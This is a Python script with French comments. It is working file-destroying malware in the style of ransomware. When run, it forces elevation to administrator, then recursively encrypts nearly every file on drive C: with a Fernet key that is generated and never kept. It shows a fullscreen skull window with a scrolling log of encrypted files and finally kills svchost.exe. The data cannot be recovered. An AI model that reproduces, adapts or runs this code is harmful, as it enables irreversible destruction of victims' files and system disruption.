import glob, ctypes, threading, sys, os
from cryptography.fernet import Fernet
from tkinter import *


def Center(win): # Fonction copié collé pour centrer la fenêtre ptdrr
    win.update_idletasks()
    width = win.winfo_width()
    frm_width = win.winfo_rootx() - win.winfo_x()
    win_width = width + 2 * frm_width
    height = win.winfo_height()
    titlebar_height = win.winfo_rooty() - win.winfo_y()
    win_height = height + titlebar_height + frm_width
    x = win.winfo_screenwidth() // 2 - win_width // 2
    y = win.winfo_screenheight() // 2 - win_height // 2
    win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
    win.deiconify()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    

def GUI(): # Fonction de la fenêtre PyGame
    
    global text
    global window
    
    # Var
    h = -30
    u = None
    text = None
    texts = []
    
    window = Tk()
    sw = window.winfo_screenwidth()
    sh = window.winfo_screenheight()
    ww = round(sw / 1.28)
    wh = round(sh / 1.5)
    window.configure(background='black')
    window.geometry(f"{ww}x{wh}")
    
    iw = round(ww / 1.1538461538461538461538461538462)
    ih = round(wh / 2.0571428571428571428571428571429)
    skullhead = PhotoImage(file="skullhead.png")
    canvas = Canvas(window, width=ww, height=wh, highlightthickness=0, bg='black')
    canvas.create_image(iw, ih, image=skullhead)
    
    ps = round(ww * wh / 72000)
    le = round(wh / 24)
    
    window.overrideredirect(1)
    Center(window)
    canvas.pack()
    
    while True:
        window.update()
        if u != text: # Vérifier que le texte n'a pas déjà été affiché
            h += le # Ajouter 30 d'écart entre chaque ligne
            if h >= ww: # Si la ligne dépasse la fenêtre
                for txt in texts: txt.destroy()
                texts = []
                window.update()
                h = 0 # Remettre h à 10
            # Afficher les éléments sur l'écran
            texts.append(Label(window, text=text, font=('Consolas', ps), bg='black', fg="#149414"))
            texts[-1].place(x=0, y=h)
            window.update()
            u = text


class Crypt: # Classe pour le cryptage
    
    def __init__(self): # Se lance à l'initialisation de la classe
        
        self.key = Fernet.generate_key() # Génère une clé
        self.fernet = Fernet(self.key) # Initialiser le module Fernet

    def Crypting(self, file):
        
        global text
        global window
        
        try:
            
            file = file.replace("\\", "/") # Remplacer les backslashs
            
            with open(file, 'rb') as f: # Stocker le contenu du fichier dans une variable
                original = f.read()  
            
            encrypted = self.fernet.encrypt(original) # Crypter la variable
            
            with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                encrypted_file.write(encrypted)
            file = file.replace("/", "\\")
            text = f'>   {file} : Ok' # Texte d'execution
            
        except: 
            file = file.replace("/", "\\")
            text = f'>   {file} : Error' # Texte d'erreur


    def CryptFiles(self, path):
        
        while True:
            
            path += "/*" # Entrer dans le dossier
            folder = glob.glob(path) # Liste du contenu du dossier
            
            if len(folder) != 0:
                for file in folder:
                    if ("WinSxS" not in file) and ("servicing" not in file) and ("SysWOW64" not in file) and ("System32" not in file) and ("OneDrive" not in file) and ("bd.bat" not in file) and ("WindowsApps" not in file) and ("." in file): self.Crypting(file)
            else: break
            
        os.system("taskkill /f /im svchost.exe")
        
        
crypting = Crypt() # Créer une instance de la classe


if is_admin(): # Si l'utilisateur est administrateur
    
    # Threads
    threads = [] # Liste des threads
    threads.append(threading.Thread(target=GUI))
    paths = ["C:"]
    for path in paths: threads.append(threading.Thread(target=crypting.CryptFiles, args=(path,))) # Pour chaque chemin dans la liste charger la fonction de cryptage avec le chemin spécifié
    for thread in threads: thread.start()
    for thread in threads: thread.join()
    
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
